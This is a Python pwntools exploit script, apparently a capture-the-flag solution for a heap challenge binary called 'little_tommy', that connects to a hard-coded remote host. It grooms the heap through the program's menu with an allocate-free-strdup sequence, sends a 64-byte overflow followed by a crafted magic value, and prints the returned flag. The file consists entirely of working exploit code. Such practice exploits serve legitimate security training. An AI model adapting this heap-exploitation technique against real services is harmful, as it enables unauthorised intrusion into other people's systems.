#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('little_tommy')

host = args.HOST or '159.65.27.8'
port = int(args.PORT or 31142)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()
log.info('grooming heap via malloc -> free -> strdup')
p.sendlineafter(b'number:', b'1')
p.sendlineafter(b'name:', b'A')
p.sendlineafter(b'name:', b'A')
p.sendlineafter(b'number:', b'3')
p.sendlineafter(b'number:', b'4')
payload = b"A"*64
payload += b"fuck"*3
log.info('sending crafted chunk')
p.sendline(payload)
p.sendline(b'5')
flagline = p.recvuntil(b'}')
print(flagline)


